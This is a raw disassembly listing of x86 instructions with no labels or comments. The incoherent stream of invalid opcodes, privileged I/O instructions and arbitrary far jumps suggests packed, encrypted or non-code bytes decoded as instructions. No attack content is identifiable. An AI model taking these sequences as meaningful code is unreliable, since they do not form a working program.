  41d01d:	xor    dl,BYTE PTR [ecx-0x355e6911]
  41d023:	adc    ch,0x53
  41d026:	xchg   edx,eax
  41d027:	(bad)  
  41d028:	nop
  41d029:	push   ss
  41d02a:	ret    0x2593
  41d02d:	inc    edx
  41d02e:	add    al,0x57
  41d030:	add    edx,edi
  41d032:	mov    ebx,0x1e0cca11
  41d037:	fild   WORD PTR [edx-0x7]
  41d03a:	cmc    
  41d03b:	(bad)  
  41d03c:	mov    ds:0x2d10ba94,al
  41d041:	jbe    0x41cfd2
  41d043:	mov    bh,0xed
  41d045:	mov    bl,0xe3
  41d047:	ins    BYTE PTR es:[edi],dx
  41d048:	inc    ebp
  41d049:	in     al,0xcd
  41d04b:	(bad)  
  41d04c:	jnp    0x41d0a6
  41d04e:	push   0x79f18d5a
  41d053:	xchg   esp,eax
  41d054:	fcmovb st,st(3)
  41d056:	shr    DWORD PTR [ecx+0x2e],0x80
  41d05a:	mov    WORD PTR [ebp+0x59],cs
  41d05d:	mov    WORD PTR [edx],ss
  41d05f:	fist   DWORD PTR [ecx-0x6fdb981b]
  41d065:	cmp    eax,0x1f89e78
  41d06a:	mov    edi,0xf49a08cc
  41d06f:	sbb    al,BYTE PTR [ecx]
  41d071:	(bad)  
  41d072:	dec    ebx
  41d073:	sti    
  41d074:	xchg   edx,eax
  41d075:	push   0xb527b7a1
  41d07a:	xchg   ebp,eax
  41d07b:	push   0xd11d1260
  41d080:	iret   
  41d081:	pop    ss
  41d082:	jmp    0xe9fe4fb
  41d087:	push   ss
  41d088:	cmp    bh,BYTE PTR [edx]
  41d08a:	(bad)  
  41d08b:	mov    dl,0xd7
  41d08d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d08e:	inc    eax
  41d08f:	pop    ds
  41d090:	mov    BYTE PTR [ebx+0x4202a374],dh
  41d096:	xchg   ecx,eax
  41d097:	jae    0x41d038
  41d099:	lods   al,BYTE PTR ds:[esi]
  41d09a:	mov    esp,0xac3b134b
  41d09f:	stos   DWORD PTR es:[edi],eax
  41d0a0:	pop    eax
  41d0a1:	jae    0x41d0ce
  41d0a3:	sub    DWORD PTR [edi],edx
  41d0a5:	dec    ebx
  41d0a6:	jg     0x41d05c
  41d0a8:	adc    eax,ebx
  41d0aa:	add    eax,0xa45e82f7
  41d0af:	gs int 0x6f
  41d0b2:	fist   WORD PTR [edi+0x369dfbd9]
  41d0b8:	(bad)  
  41d0b9:	repz pop esp
  41d0bb:	retf   0x99fe
  41d0be:	xor    BYTE PTR [ecx-0x6315f388],0xc1
  41d0c5:	shl    esi,cl
  41d0c7:	sbb    BYTE PTR [ebx-0x205a2e24],bh
  41d0cd:	je     0x41d143
  41d0cf:	sub    eax,0x154f7cf
  41d0d4:	add    al,0xae
  41d0d6:	sbb    DWORD PTR [ecx-0x1d],0x7e
  41d0da:	pop    edx
  41d0db:	cmp    al,0xdd
  41d0dd:	sub    BYTE PTR [ecx+esi*4+0x69],dl
  41d0e1:	sbb    eax,0x4ae17226
  41d0e6:	shl    BYTE PTR [ebp+0x63],cl
  41d0e9:	jmp    0x41d122
  41d0eb:	std    
  41d0ec:	cmp    bl,0x8b
  41d0ef:	iret   
  41d0f0:	ret    0xab1f
  41d0f3:	jl     0x41d159
  41d0f5:	mov    esi,0xc5bdcf59
  41d0fa:	lahf   
  41d0fb:	cmp    BYTE PTR [ebx],ah
  41d0fd:	add    ch,al
  41d0ff:	mov    ebp,DWORD PTR [eax-0x797e779c]
  41d105:	inc    ebx
  41d106:	xchg   BYTE PTR [edi],bl
  41d108:	xor    BYTE PTR [ecx],0x45
  41d10b:	loope  0x41d0e1
  41d10d:	mov    al,0xd1
  41d10f:	and    ebx,ebx
  41d111:	jno    0x41d13a
  41d113:	test   DWORD PTR [esi*4+0x512c5e80],eax
  41d11a:	fsub   st,st(4)
  41d11c:	xchg   ebx,eax
  41d11d:	mov    ebp,0x10caf77f
  41d122:	mov    eax,ds:0x1b61da24
  41d127:	rcr    BYTE PTR ds:0xd469893c,cl
  41d12d:	inc    ebp
  41d12e:	lea    ebp,[edx-0x7b]
  41d131:	stos   BYTE PTR es:[edi],al
  41d132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d133:	lahf   
  41d134:	ds gs cld 
  41d137:	(bad)  [eax-0x6a]
  41d13a:	fwait
  41d13b:	into   
  41d13c:	and    al,0xbe
  41d13e:	jbe    0x41d18d
  41d140:	inc    edx
  41d141:	jmp    0xe896:0x67dd5a8a
  41d148:	and    ch,BYTE PTR ds:0xbf8fd576
  41d14e:	aam    0xb3
  41d150:	push   ss
  41d151:	push   cs
  41d152:	popa   
  41d153:	cli    
  41d154:	xchg   ebp,eax
  41d155:	ins    DWORD PTR es:[edi],dx
  41d156:	adc    al,BYTE PTR [ecx-0x6d55502a]
  41d15c:	pop    ebp
  41d15d:	jbe    0x41d162
  41d15f:	mov    fs,WORD PTR [esi]
  41d161:	adc    bl,BYTE PTR [ecx+0x59f9c4b9]
  41d167:	ss jp  0x41d10d
  41d16a:	scas   al,BYTE PTR es:[edi]
  41d16b:	jge    0x41d169
  41d16d:	and    bl,dh
  41d16f:	adc    DWORD PTR [eax+0x5cf27d19],ebp
  41d175:	jmp    0x251d0feb
  41d17a:	sbb    eax,0xffbea2f9
  41d17f:	ror    ecx,0x54
  41d182:	sub    esp,DWORD PTR [edi+0x316e277b]
  41d188:	or     eax,0xe3604f10
  41d18d:	in     eax,dx
  41d18e:	fsubr  DWORD PTR [edx+edx*4]
  41d191:	rcr    DWORD PTR [eax-0x76],cl
  41d194:	fisttp QWORD PTR ds:0x7ed2cbd
  41d19a:	addr16 js 0x41d190
  41d19d:	jg     0x41d213
  41d19f:	ret    
  41d1a0:	ret    0xa9ba
  41d1a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1a4:	mov    cl,bh
  41d1a6:	retw   0x336f
  41d1aa:	pop    eax
  41d1ab:	jb     0x41d201
  41d1ad:	fiadd  WORD PTR ds:0xb565193c
  41d1b3:	lds    edi,FWORD PTR [ecx]
  41d1b5:	std    
  41d1b6:	mov    bh,0xdf
  41d1b8:	jne    0x41d200
  41d1ba:	popa   
  41d1bb:	(bad)  
  41d1bc:	(bad)  
  41d1bd:	pop    ebp
  41d1be:	jmp    0x41d237
  41d1c0:	push   ss
  41d1c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1c2:	push   ebx
  41d1c3:	cli    
  41d1c4:	loop   0x41d199
  41d1c6:	jmp    0x41d1b7
  41d1c8:	mov    edi,0x1bd255d8
  41d1cd:	push   0xd756d091
  41d1d2:	dec    ecx
  41d1d3:	pop    ss
  41d1d4:	sub    DWORD PTR [edx+0x1dabd248],0x47afc474
  41d1de:	xchg   ebp,eax
  41d1df:	xchg   esi,eax
  41d1e0:	or     DWORD PTR [ecx-0x30],0x7edc98c
  41d1e7:	fldenv [eax-0x5aeae168]
  41d1ed:	ret    0x7a94
  41d1f0:	scas   eax,DWORD PTR es:[edi]
  41d1f1:	mov    ebx,0x9be4770d
  41d1f6:	xchg   ebp,eax
  41d1f7:	pop    edi
  41d1f8:	ja     0x41d261
  41d1fa:	aaa    
  41d1fb:	jl     0x41d1ed
  41d1fd:	mov    ds:0xca164c11,al
  41d202:	sbb    eax,ecx
  41d204:	scas   eax,DWORD PTR es:[edi]
  41d205:	sbb    DWORD PTR [eax],esi
  41d207:	dec    esp
  41d208:	stos   DWORD PTR es:[edi],eax
  41d209:	jo     0x41d213
  41d20b:	in     al,0x38
  41d20d:	ins    BYTE PTR es:[edi],dx
  41d20e:	daa    
  41d20f:	ins    DWORD PTR es:[edi],dx
  41d210:	sub    DWORD PTR [esi],ebx
  41d212:	xor    DWORD PTR [ebp-0x3f],esp
  41d215:	xchg   ebp,eax
  41d216:	or     edi,DWORD PTR [edx+0x387121dc]
  41d21c:	sub    DWORD PTR [ecx+0x1c16b25a],eax
  41d222:	daa    
  41d223:	xchg   DWORD PTR [ecx+0x3ec34b49],esi
  41d229:	or     BYTE PTR [ebx-0x12cbebc5],bh
  41d22f:	jbe    0x41d25f
  41d231:	pop    ecx
  41d232:	nop
  41d233:	cmp    al,0xa8
  41d235:	rol    DWORD PTR [edx+0x18f9f6ab],1
  41d23b:	lods   al,BYTE PTR ds:[esi]
  41d23c:	ja     0x41d1d2
  41d23e:	or     edx,0x80085759
  41d244:	and    eax,DWORD PTR [edx+0xd]
  41d247:	adc    eax,0xa5752ea6
  41d24c:	mov    dh,0x19
  41d24e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d24f:	pop    esi
  41d250:	fld    QWORD PTR [esi-0x7ecfb5e3]
  41d256:	fdiv   st,st(7)
  41d258:	hlt    
  41d259:	jae    0x41d26d
  41d25b:	pop    eax
  41d25c:	dec    esi
  41d25d:	adc    BYTE PTR [edx+eax*8+0x15],0xbe
  41d262:	dec    esi
  41d263:	and    ebp,esp
  41d265:	es ret 
  41d267:	lahf   
  41d268:	or     cl,0xd7
  41d26b:	xchg   esp,eax
  41d26c:	test   eax,0x356d83e0
  41d271:	push   ebx
  41d272:	sti    
  41d273:	xor    bh,BYTE PTR [edx+0x22]
  41d276:	mov    edx,0x1c1a3602
  41d27b:	and    DWORD PTR [ebp+0x23],esp
  41d27e:	shr    BYTE PTR [edi+0x3b],cl
  41d281:	sar    BYTE PTR [ecx+ebp*1-0x28],cl
  41d285:	sbb    al,0xf5
  41d287:	int3   
  41d288:	popf   
  41d289:	popf   
  41d28a:	or     ah,BYTE PTR [ebp-0x229d9ecf]
  41d290:	in     al,dx
  41d291:	mov    eax,ds:0xa5dccc9
  41d296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d297:	or     DWORD PTR [eax+0x7821bc78],esp
  41d29d:	jbe    0x41d2c2
  41d29f:	(bad)  
  41d2a0:	imul   edi,DWORD PTR [esi+0x6e0f1cdf],0xffffffd7
  41d2a7:	inc    ebx
  41d2a8:	(bad)  
  41d2a9:	xlat   BYTE PTR ds:[ebx]
  41d2aa:	cmp    DWORD PTR [eax-0x21],ecx
  41d2ad:	pop    eax
  41d2ae:	push   edi
  41d2af:	xchg   ecx,ebx
  41d2b1:	call   0xcbc73d82
  41d2b6:	out    dx,al
  41d2b7:	pop    esi
  41d2b8:	add    eax,0xb01e5faa
  41d2bd:	clc    
  41d2be:	nop
  41d2bf:	dec    edx
  41d2c0:	bound  edx,QWORD PTR [ecx+0x3]
  41d2c3:	int    0x17
  41d2c5:	inc    edi
  41d2c6:	jbe    0x41d24e
  41d2c8:	(bad)  
  41d2c9:	fmul   QWORD PTR [ebp-0x48acacce]
  41d2cf:	ret    
  41d2d0:	ficomp DWORD PTR [ebx+esi*2]
  41d2d3:	inc    ebx
  41d2d4:	pop    ss
  41d2d5:	repnz adc BYTE PTR [ebp-0x4cb29abe],dl
  41d2dc:	(bad)  
  41d2dd:	xchg   edx,eax
  41d2de:	cmp    BYTE PTR [esi],0x7c
  41d2e1:	xchg   ebp,eax
  41d2e2:	leave  
  41d2e3:	aas    
  41d2e4:	imul   ebx,DWORD PTR [eax],0x24f9c3af
  41d2ea:	nop
  41d2eb:	dec    ebp
  41d2ec:	(bad)  
  41d2ed:	jns    0x41d30e
  41d2ef:	or     eax,0x3deb5ec1
  41d2f4:	sub    al,0xb
  41d2f6:	mov    ds:0x49439cd8,al
  41d2fb:	ret    
  41d2fc:	lahf   
  41d2fd:	lods   al,BYTE PTR ds:[esi]
  41d2fe:	jmp    0xa7e3:0x39009054
  41d305:	pusha  
  41d306:	adc    edi,DWORD PTR [edi+0x3b]
  41d309:	sbb    dl,BYTE PTR [ebp+0x10]
  41d30c:	xor    bh,ch
  41d30e:	push   ecx
  41d30f:	cmp    ebp,0xffffffb7
  41d312:	cmp    esp,DWORD PTR [ecx+0x76fda22e]
  41d318:	jle    0x41d355
  41d31a:	push   esp
  41d31b:	loopne 0x41d35a
  41d31d:	in     al,0xe0
  41d31f:	add    al,0xa7
  41d321:	mov    dh,0x2e
  41d323:	adc    esp,DWORD PTR [edi]
  41d325:	inc    esi
  41d326:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d327:	pop    ebp
  41d328:	fld    st(1)
  41d32a:	mov    ebx,0x229715a4
  41d32f:	mov    al,ds:0x1db655d1
  41d334:	loope  0x41d2d6
  41d336:	pop    ss
  41d337:	jecxz  0x41d34a
  41d339:	sub    bl,BYTE PTR [esi+esi*2]
  41d33c:	jle    0x41d2f3
  41d33e:	(bad)  [edx]
  41d340:	jmp    0x184533fa
  41d345:	pushf  
  41d346:	lods   eax,DWORD PTR ds:[esi]
  41d347:	dec    ebp
  41d348:	or     eax,0xf39a26a3
  41d34d:	fnstsw WORD PTR [esp+eax*4-0x60298db9]
  41d354:	pop    ds
  41d355:	shl    cl,0x4d
  41d358:	cmp    edi,DWORD PTR [edx+0x4e8b3174]
  41d35e:	mov    dl,BYTE PTR [ebp-0x4]
  41d361:	stos   DWORD PTR es:[edi],eax
  41d362:	data16 in al,dx
  41d364:	inc    ecx
  41d365:	mov    esi,0x11a40905
  41d36a:	ror    ch,1
  41d36c:	mov    DWORD PTR [ebp-0x2c10f895],0xa6aea51c
  41d376:	arpl   WORD PTR [ecx+edi*1-0x1b],ax
  41d37a:	out    dx,al
  41d37b:	addr16 mov ds:0x7338,eax
  41d37f:	pop    ss
  41d380:	cwde   
  41d381:	cmp    BYTE PTR [edx-0x53846674],al
  41d387:	stos   BYTE PTR es:[edi],al
  41d388:	xchg   edi,eax
  41d389:	cmp    ebp,ebp
  41d38b:	hlt    
  41d38c:	addr16 retf 
  41d38e:	scas   al,BYTE PTR es:[edi]
  41d38f:	push   ecx
  41d390:	sbb    al,0xa5
  41d392:	or     al,0xc7
  41d394:	dec    ebp
  41d395:	push   esp
  41d396:	inc    esi
  41d397:	daa    
  41d398:	and    eax,0x1eeefc61
  41d39d:	leave  
  41d39e:	jle    0x41d3c5
  41d3a0:	add    edi,DWORD PTR [ebp-0x2f]
  41d3a3:	js     0x41d34f
  41d3a5:	mov    al,ds:0x7ea675d8
  41d3aa:	pusha  
  41d3ab:	fcomp  QWORD PTR [esi+0x6dfa6699]
  41d3b1:	xor    eax,0x3f7b4ae1
  41d3b6:	lods   al,BYTE PTR ds:[esi]
  41d3b7:	loop   0x41d41f
  41d3b9:	fidivr WORD PTR [esi-0x2e]
  41d3bc:	xor    al,0x32
  41d3be:	imul   esi,DWORD PTR [eax+ebx*1],0xffffffa4
  41d3c2:	jb     0x41d379
  41d3c4:	and    DWORD PTR [ebx],edx
  41d3c6:	shl    DWORD PTR [edi+0x35],1
  41d3c9:	sbb    esp,DWORD PTR [ebp-0x2]
  41d3cc:	scas   eax,DWORD PTR es:[edi]
  41d3cd:	or     eax,0xcaa54952
  41d3d2:	dec    esp
  41d3d3:	sub    eax,0xe10531d3
  41d3d8:	shr    BYTE PTR [ebp-0x55],1
  41d3db:	sbb    BYTE PTR [esi],cl
  41d3dd:	jge    0x41d389
  41d3df:	ret    
  41d3e0:	call   0x2e0e:0x47cb9f7c
  41d3e7:	iret   
  41d3e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3e9:	sar    DWORD PTR [edx],1
  41d3eb:	out    dx,eax
  41d3ec:	adc    eax,0xca9151c4
  41d3f1:	jge    0x41d3b8
  41d3f3:	mov    dh,BYTE PTR [edi]
  41d3f5:	dec    ebx
  41d3f6:	jmp    0xb42fa743
  41d3fb:	adc    eax,0x48f11977
  41d401:	in     al,0x3
  41d403:	push   ds
  41d404:	sar    DWORD PTR [ecx],0x56
  41d407:	push   cs
  41d408:	sbb    esi,esp
  41d40a:	xchg   ebp,eax
  41d40b:	icebp  
  41d40c:	iret   
  41d40d:	in     al,dx
  41d40e:	test   al,0x8d
  41d410:	rol    DWORD PTR [esi-0x3d],1
  41d413:	fnstenv [ebp-0x67]
  41d416:	or     eax,DWORD PTR [eax+0x62]
  41d419:	ret    
  41d41a:	sub    al,0xce
  41d41c:	xor    BYTE PTR [ebp+0x605666b9],bl
  41d422:	push   ecx
  41d423:	ins    DWORD PTR es:[edi],dx
  41d424:	adc    DWORD PTR [ebx+0x4997475f],ebx
  41d42a:	hlt    
  41d42b:	retf   
  41d42c:	adc    edi,ebx
  41d42e:	mov    ch,bl
  41d430:	les    ebx,FWORD PTR [ebp+0x2f]
  41d433:	xchg   edx,eax
  41d434:	jne    0x41d492
  41d436:	pop    ds
  41d437:	jge    0x41d46b
  41d439:	mov    edx,0xa4fb4544
  41d43e:	inc    esi
  41d43f:	xchg   ecx,eax
  41d440:	add    BYTE PTR [ebx+eiz*8-0x24a2fc73],0x20
  41d448:	mov    edx,ebp
  41d44a:	cwde   
  41d44b:	dec    ebp
  41d44c:	mov    ds:0x56735a1c,al
  41d451:	dec    edi
  41d452:	sahf   
  41d453:	dec    edx
  41d454:	(bad)  
  41d455:	aas    
  41d456:	test   BYTE PTR [esi+0x77d6cba2],ch
  41d45c:	sub    DWORD PTR [edx-0x76881b51],0x56dcf14a
  41d466:	rcr    DWORD PTR [edx],0x38
  41d469:	mov    BYTE PTR [esi],ch
  41d46b:	mov    edi,0x540c264c
  41d470:	fsubr  st(4),st
  41d472:	adc    eax,0xbc9901a2
  41d477:	xchg   DWORD PTR [edi-0x42],ecx
  41d47a:	or     al,0x83
  41d47c:	dec    edx
  41d47d:	icebp  
  41d47e:	add    ah,ch
  41d480:	iret   
  41d481:	gs pop ds
  41d483:	jl     0x41d45e
  41d485:	dec    esi
  41d486:	xchg   DWORD PTR [edi-0x5],esi
  41d489:	mov    edx,0x159ba51a
  41d48e:	xchg   ebx,eax
  41d48f:	(bad)  
  41d490:	pop    ebp
  41d491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d492:	repz clc 
  41d494:	xor    DWORD PTR [esi],edi
  41d496:	push   ss
  41d497:	arpl   WORD PTR [edi-0x3],dx
  41d49a:	je     0x41d4ee
  41d49c:	xchg   edi,eax
  41d49d:	jno    0x41d4b4
  41d49f:	shr    DWORD PTR [ebx+0x72e79a98],1
  41d4a5:	dec    ebx
  41d4a6:	popf   
  41d4a7:	mov    ds:0x62bad36d,eax
  41d4ac:	scas   al,BYTE PTR es:[edi]
  41d4ad:	sub    al,0xe
  41d4af:	mov    ds:0x125fc6b9,eax
  41d4b4:	cwde   
  41d4b5:	out    0x71,al
  41d4b7:	(bad)  
  41d4b8:	push   ebp
  41d4b9:	lods   al,BYTE PTR ds:[esi]
  41d4ba:	shl    dl,0x82
  41d4bd:	inc    ebx
  41d4be:	or     esi,ebp
  41d4c0:	pop    ds
  41d4c1:	inc    esi
  41d4c2:	ins    DWORD PTR es:[edi],dx
  41d4c3:	fist   DWORD PTR [edi+esi*4]
  41d4c6:	mov    al,0xd5
  41d4c8:	test   dh,bl
  41d4ca:	push   edx
  41d4cb:	pop    esp
  41d4cc:	fmul   st,st(7)
  41d4ce:	shl    DWORD PTR [ebx],1
  41d4d0:	jp     0x41d482
  41d4d2:	lds    ecx,FWORD PTR [ebx+0x1a5d6064]
  41d4d8:	sub    DWORD PTR [edx+ebx*1+0x4585988d],eax
  41d4df:	ss in  eax,dx
  41d4e1:	push   esp
  41d4e2:	js     0x41d4e1
  41d4e4:	lock jb 0x41d503
  41d4e7:	arpl   WORD PTR [ebx-0x3c],dx
  41d4ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4eb:	cmc    
  41d4ec:	(bad)  
  41d4ed:	jbe    0x41d46f
  41d4ef:	dec    esi
  41d4f0:	ja     0x41d558
  41d4f2:	xor    dh,al
  41d4f4:	int3   
  41d4f5:	pop    eax
  41d4f6:	dec    ecx
  41d4f7:	shl    BYTE PTR [ebx],0x5f
  41d4fa:	stos   BYTE PTR es:[edi],al
  41d4fb:	cmc    
  41d4fc:	sub    al,0x7e
  41d4fe:	jmp    0x41d4cf
  41d500:	xlat   BYTE PTR gs:[ebx]
  41d502:	int3   
  41d503:	popa   
  41d504:	fsubp  st(4),st
  41d506:	and    eax,0xce1e3c7d
  41d50b:	mov    ch,0x97
  41d50d:	sub    DWORD PTR [esi-0x12aaea1e],esi
  41d513:	cmp    bl,BYTE PTR [esi-0x27]
  41d516:	pop    ecx
  41d517:	std    
  41d518:	in     eax,0xac
  41d51a:	push   ebx
  41d51b:	mov    bl,0x3a
  41d51d:	xor    ebp,esp
  41d51f:	fadd   DWORD PTR [ebp+0x4a]
  41d522:	std    
  41d523:	outs   dx,BYTE PTR ds:[esi]
  41d524:	dec    ebp
  41d525:	push   0x44071a4d
  41d52a:	sbb    al,0x80
  41d52c:	aaa    
  41d52d:	popa   
  41d52e:	mov    esi,0x153d78c
  41d533:	dec    ebp
  41d534:	mov    ds:0xa43cf203,al
  41d539:	pop    ss
  41d53a:	xor    BYTE PTR ds:0xa5ecfcfc,0x33
  41d541:	mov    edi,0x85aab82d
  41d546:	popa   
  41d547:	aam    0x1a
  41d549:	sbb    ecx,ebp
  41d54b:	aad    0x83
  41d54d:	adc    ebp,DWORD PTR [ecx+0x4e]
  41d550:	inc    ebp
  41d551:	jmp    0x1d60:0xc4e142c6
  41d558:	jge    0x41d5b1
  41d55a:	xor    BYTE PTR [esp+ebx*4-0xe36dbfb],bh
  41d561:	pop    ebx
  41d562:	mov    al,ds:0xe79a3e25
  41d567:	jb     0x41d5d4
  41d569:	stc    
  41d56a:	push   ebx
  41d56b:	imul   edx,DWORD PTR [edi-0x59],0x1ae69ce0
  41d572:	xchg   esp,eax
  41d573:	push   esp
  41d574:	call   0x811c:0x4fc9b801
  41d57b:	mov    esp,0xbc0d20c9
  41d580:	and    dl,BYTE PTR [ebp-0x3cfc5fa7]
  41d586:	push   edx
  41d587:	call   0x6a65:0x4e8e715a
  41d58e:	xchg   edi,eax
  41d58f:	push   ebx
  41d590:	pop    edi
  41d591:	mov    esi,0x2e4a790b
  41d596:	fsub   st,st(0)
  41d598:	adc    eax,0xcedb2281
  41d59d:	xchg   esp,eax
  41d59e:	int3   
  41d59f:	imul   eax,DWORD PTR [edi-0x71808905],0xdfb12a50
  41d5a9:	in     al,0xc5
  41d5ab:	pop    esi
  41d5ac:	repnz enter 0xcf77,0x51
  41d5b1:	sub    BYTE PTR [ebx+eiz*4-0x43705bda],ch
  41d5b8:	cs ror ecx,0x1c
  41d5bc:	mov    BYTE PTR [edi+0x37],ch
  41d5bf:	ss jmp 0xb0a6f144
  41d5c5:	into   
  41d5c6:	cwde   
  41d5c7:	pop    edx
  41d5c8:	leave  
  41d5c9:	dec    esp
  41d5ca:	daa    
  41d5cb:	dec    edx
  41d5cc:	push   0x8d76ad57
  41d5d1:	adc    cl,BYTE PTR [esi-0xa2728c4]
  41d5d7:	jp     0x41d55f
  41d5d9:	adc    eax,0x3fd40f6e
  41d5de:	scas   eax,DWORD PTR es:[edi]
  41d5df:	cmp    eax,0x362ebe79
  41d5e4:	cmc    
  41d5e5:	aad    0x67
  41d5e7:	mov    ds:0xd36ed4c,al
  41d5ec:	out    dx,eax
  41d5ed:	sahf   
  41d5ee:	vpmacsdqh ymm3,ymm2,YMMWORD PTR [ecx+eax*8+0x46d2d343],ymm6
  41d5f9:	cld    
  41d5fa:	loope  0x41d57c
  41d5fc:	shr    DWORD PTR [esi-0x65],1
  41d5ff:	(bad)  
  41d600:	sub    BYTE PTR [esi+0x23],cl
  41d603:	cwde   
  41d604:	aam    0x9e
  41d606:	icebp  
  41d607:	mov    bl,0xc7
  41d609:	xchg   BYTE PTR [ecx],cl
  41d60b:	xor    esi,DWORD PTR [ebx-0x79e0f74e]
  41d611:	push   edi
  41d612:	and    bl,cl
  41d614:	fyl2xp1 
  41d616:	push   cs
  41d617:	mov    esi,0x206c51de
  41d61c:	sbb    cl,BYTE PTR [eax-0x7f]
  41d61f:	sbb    bl,al
  41d621:	das    
  41d622:	inc    ecx
  41d623:	sar    DWORD PTR [esi],0x9e
  41d626:	lds    edi,FWORD PTR [edi]
  41d628:	rol    BYTE PTR [ebx-0x54],0x36
  41d62c:	cmc    
  41d62d:	das    
  41d62e:	xchg   ebx,eax
  41d62f:	sar    DWORD PTR [ebp-0x44],0x15
  41d633:	ret    0x7385
  41d636:	mov    edi,0x5e7197c7
  41d63b:	push   esi
  41d63c:	call   0x24195672
  41d641:	xor    eax,0x936fe53e
  41d646:	fimul  WORD PTR [edi+0x1e]
  41d649:	in     eax,0x5f
  41d64b:	shr    DWORD PTR gs:[ecx],cl
  41d64e:	in     al,0xde
  41d650:	call   0xcfc5:0x8c35594
  41d657:	sti    
  41d658:	mov    cl,BYTE PTR [ecx]
  41d65a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d65b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d65c:	xchg   esi,eax
  41d65d:	call   0xb9dc:0x9c988999
  41d664:	es adc al,0x12
  41d667:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41d669:	jl     0x41d632
  41d66b:	push   ss
  41d66c:	pop    ss
  41d66d:	ud2    
  41d66f:	push   esp
  41d670:	cmp    ecx,ecx
  41d672:	in     eax,0x7b
  41d674:	mov    al,ds:0x1fd8c7c8
  41d679:	push   cs
  41d67a:	mov    ecx,0x378a0897
  41d67f:	dec    ecx
  41d680:	fild   QWORD PTR fs:[eax+0x73b91638]
  41d687:	dec    esi
  41d688:	adc    BYTE PTR [eax-0x590803e8],al
  41d68e:	pop    edx
  41d68f:	and    BYTE PTR [ebp+0x17e3f762],al
  41d695:	ja     0x41d700
  41d697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d698:	jmp    0x41d655
  41d69a:	inc    edx
  41d69b:	addr16 mov esp,0x94234dc9
  41d6a1:	(bad)  [edx-0x55d5994c]
  41d6a7:	rcl    DWORD PTR [edx+ebx*4+0x3f],cl
  41d6ab:	and    dh,dl
  41d6ad:	fdiv   DWORD PTR [edx+0x104a102e]
  41d6b3:	xlat   BYTE PTR ds:[ebx]
  41d6b4:	scas   eax,DWORD PTR es:[edi]
  41d6b5:	sub    eax,DWORD PTR [ebx+eiz*2-0x17]
  41d6b9:	loop   0x41d6a4
  41d6bb:	or     BYTE PTR [ecx],0xbf
  41d6be:	dec    esp
  41d6bf:	and    dl,BYTE PTR [edx-0x47]
  41d6c2:	inc    ecx
  41d6c3:	jl     0x41d6a8
  41d6c5:	dec    ecx
  41d6c6:	js     0x41d68e
  41d6c8:	cs xchg ebx,eax
  41d6ca:	into   
  41d6cb:	add    BYTE PTR [ecx],cl
  41d6cd:	xchg   esp,eax
  41d6ce:	nop
  41d6cf:	push   edx
  41d6d0:	or     bh,al
  41d6d2:	dec    edi
  41d6d3:	jecxz  0x41d66c
  41d6d5:	pop    esi
  41d6d6:	sti    
  41d6d7:	fs add eax,0xd28e33ef
  41d6dd:	push   0xffffffbc
  41d6df:	mov    al,0xde
  41d6e1:	(bad)  
  41d6e2:	push   ebp
  41d6e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6e4:	adc    BYTE PTR [eax-0x7c],bl
  41d6e7:	inc    ebp
  41d6e8:	mov    ch,0x8b
  41d6ea:	out    0x97,eax
  41d6ec:	jge    0x41d736
  41d6ee:	mov    fs,WORD PTR [ebx-0x64d61cc5]
  41d6f4:	xor    edx,ebx
  41d6f6:	jno    0x41d6f6
  41d6f8:	stos   BYTE PTR es:[edi],al
  41d6f9:	(bad)  
  41d6fa:	add    al,0x56
  41d6fc:	push   ebp
  41d6fd:	stos   DWORD PTR es:[edi],eax
  41d6fe:	adc    al,0x35
  41d700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d701:	ret    
  41d702:	xchg   edi,eax
  41d703:	rol    DWORD PTR [ebx-0x2e],1
  41d706:	inc    ebx
  41d707:	ret    0xe6f
  41d70a:	push   0xb97dfdf
  41d70f:	inc    eax
  41d710:	mov    eax,ds:0xcecb79c7
  41d715:	mov    ecx,0x3442ef9d
  41d71a:	gs stc 
  41d71c:	lods   al,BYTE PTR ds:[esi]
  41d71d:	imul   ebx,DWORD PTR [ebp-0x59],0xaa75b252
  41d724:	pop    ebp
  41d725:	icebp  
  41d726:	pop    es
  41d727:	adc    al,0xad
  41d729:	gs stos BYTE PTR es:[edi],al
  41d72b:	pop    esi
  41d72c:	sbb    BYTE PTR ds:0x5dff0983,bl
  41d732:	add    DWORD PTR [eax-0x1],edi
  41d735:	(bad)  
  41d736:	lods   eax,DWORD PTR ds:[esi]
  41d737:	xor    BYTE PTR [ecx+0x17],bl
  41d73a:	sbb    eax,0xd2ad89d6
  41d73f:	and    DWORD PTR [ecx+ecx*4-0x2d],edi
  41d743:	dec    esp
  41d744:	fiadd  WORD PTR [edx-0x6]
  41d747:	pop    edx
  41d748:	sub    eax,0xddd9799b
  41d74d:	pop    edi
  41d74e:	aad    0xe9
  41d750:	js     0x41d797
  41d752:	push   ebx
  41d753:	adc    BYTE PTR [eax-0x73],bl
  41d756:	cmp    DWORD PTR [ebx-0x50776fdc],ecx
  41d75c:	addr16 ret 0x74e5
  41d760:	push   ebx
  41d761:	add    eax,0xb436899c
  41d766:	adc    esp,DWORD PTR [ecx]
  41d768:	dec    ecx
  41d769:	xchg   edi,eax
  41d76a:	mov    edx,0x69d32e60
  41d76f:	sbb    bl,ch
  41d771:	push   ss
  41d772:	imul   ecx,DWORD PTR [ebx-0x231ca195],0xffffffd1
  41d779:	xchg   esi,eax
  41d77a:	lock cmp BYTE PTR [ecx-0x5b2646b8],0x7c
  41d782:	mov    eax,ds:0x9b2e36ae
  41d787:	dec    esp
  41d788:	push   ss
  41d789:	pop    eax
  41d78a:	xchg   BYTE PTR [esi+0x75b19f95],cl
  41d790:	xor    al,0xe0
